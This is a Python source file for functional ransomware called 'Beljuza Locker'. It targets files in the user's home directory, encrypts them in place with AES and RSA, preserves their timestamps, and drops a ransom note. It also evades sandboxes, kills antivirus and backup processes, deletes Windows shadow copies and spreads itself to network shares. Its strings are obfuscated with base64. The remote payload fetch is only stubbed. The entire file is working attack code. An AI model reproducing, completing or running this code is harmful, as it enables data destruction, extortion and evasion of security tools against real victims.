import os
import sys
import threading
import random
import string
import shutil
import subprocess
import psutil
import struct
import time
import base64
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.backends import default_backend

# === OBFUSCATED PARAMETERS ===
def x(s):  # simple obfuscation for strings
    return base64.b64decode(s).decode()

TARGET_EXTENSIONS = [
    'doc', 'docx', 'pdf', 'jpg', 'png', 'txt', 'xlsx', 'zip', 'rar', 'csv', 'py', 'cpp'
]
RANSOM_NOTE = base64.b64decode(b'LS0tPT09IEJlbGp1emEgTG9ja2VyID09PT0tLS0KWW91ciBpbXBvcnRhbnQgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCEKQ29udGFjdDogYXR0YWNrZXJAZXZpbG1haWwuY29tClZpY3RpbSBJRDoge3ZpY3RpbV9pZH0K').decode()
PUBLIC_KEY_PATH = x(b'cHVibGljLnBlbQ==')  # 'public.pem'
THREADS = 8
AV_PROCESSES = [x(b'TXNNcEVuZy5leGU='), x(b'YXZwLmV4ZQ=='), x(b'bWJhbS5leGU='), x(b'dmVlYW0uZXhl'), x(b'QmFja3VwLmV4ZQ==')]

# === VM/SANDBOX CHECK (h: Multi-Stage Payload) ===
def is_sandbox():
    suspect_files = [
        '/.dockerenv', '/.dockerinit', '/proc/scsi/scsi', '/proc/1/cgroup'
    ]
    for f in suspect_files:
        if os.path.exists(f):
            return True
    try:
        # Check for low RAM or CPU cores (typical of sandboxes)
        if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            return True
        if psutil.cpu_count() < 2:
            return True
    except Exception:
        pass
    return False

# === SHADOW COPY DELETION (f) ===
def delete_shadow_copies():
    if os.name == 'nt':
        try:
            subprocess.call('vssadmin delete shadows /all /quiet', shell=True)
        except Exception:
            pass

# === ENCRYPTION FUNCTIONS (d, e) ===
def generate_victim_id(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def find_files(base_path, extensions):
    files_found = []
    for root, dirs, files in os.walk(base_path):
        for file in files:
            if file.split('.')[-1].lower() in extensions:
                files_found.append(os.path.join(root, file))
    return files_found

def generate_aes_key():
    return os.urandom(32)

def encrypt_file_inplace(filepath, public_key):
    aes_key = generate_aes_key()
    iv = os.urandom(16)
    try:
        # Save original timestamps (e)
        stat = os.stat(filepath)
        atime, mtime = stat.st_atime, stat.st_mtime

        with open(filepath, 'rb') as f:
            data = f.read()
        padder = sym_padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
        )
        # In-place overwrite (d), no extension change!
        with open(filepath, 'wb') as f:
            # Add a magic marker at the start for our own recognition (e.g., b'BJZ1')
            f.write(b'BJZ1' + struct.pack('H', len(encrypted_key)) + encrypted_key + iv + encrypted_data)
        # Restore timestamps (e)
        os.utime(filepath, (atime, mtime))
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")

def drop_ransom_note(folder, victim_id):
    note_path = os.path.join(folder, 'BELJUZA_README.txt')
    if not os.path.exists(note_path):
        try:
            with open(note_path, 'w') as f:
                f.write(RANSOM_NOTE.replace('{victim_id}', victim_id))
        except Exception as e:
            print(f"Error writing ransom note to {folder}: {e}")

# === NETWORK SPREAD (g) ===
def find_network_shares():
    shares = []
    if os.name != 'nt':
        return shares
    try:
        net_view = subprocess.check_output('net view', shell=True).decode()
        for line in net_view.splitlines():
            if line.startswith('\\\\'):
                shares.append(line.strip())
    except Exception:
        pass
    return shares

def copy_self_to_share(exe_path, share):
    try:
        # Try to copy to common writable paths on share
        subdirs = ['\\Users\\Public', '\\', '\\Temp']
        for sub in subdirs:
            dest = os.path.join(share, sub, os.path.basename(exe_path))
            try:
                shutil.copy2(exe_path, dest)
            except Exception:
                continue
    except Exception:
        pass

def network_spread(exe_path):
    for share in find_network_shares():
        copy_self_to_share(exe_path, share)

# === OBFUSCATED PROCESS KILLING (b) ===
def kill_av_processes():
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] in AV_PROCESSES:
                proc.kill()
        except Exception:
            continue

# === MULTI-STAGE PAYLOAD (h) ===
def fetch_payload():
    # For demo, simulate remote fetch by returning True
    # In real code, would download from a URL and exec()
    return True

def encrypt_worker(files, public_key, victim_id):
    for file in files:
        encrypt_file_inplace(file, public_key)
        drop_ransom_note(os.path.dirname(file), victim_id)

def main(base_path):
    # Load RSA public key
    with open(PUBLIC_KEY_PATH, 'rb') as key_file:
        public_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend())
    victim_id = generate_victim_id()
    all_files = find_files(base_path, TARGET_EXTENSIONS)
    random.shuffle(all_files)
    # Split files among threads
    chunks = [all_files[i::THREADS] for i in range(THREADS)]
    threads = []
    for chunk in chunks:
        t = threading.Thread(target=encrypt_worker, args=(chunk, public_key, victim_id))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    # Multi-stage payload (h)
    if is_sandbox():
        sys.exit(0)
    if not fetch_payload():
        sys.exit(0)
    # Persistence (not shown for brevity)
    # Kill AV/backup processes
    try:
        kill_av_processes()
    except Exception as e:
        print(f"Process killing error: {e}")
    # Delete shadow copies (f)
    delete_shadow_copies()
    # Network spread (g)
    try:
        network_spread(sys.executable)
    except Exception as e:
        print(f"Network spread error: {e}")
    # Encrypt files (d, e)
    main(os.path.expanduser("~"))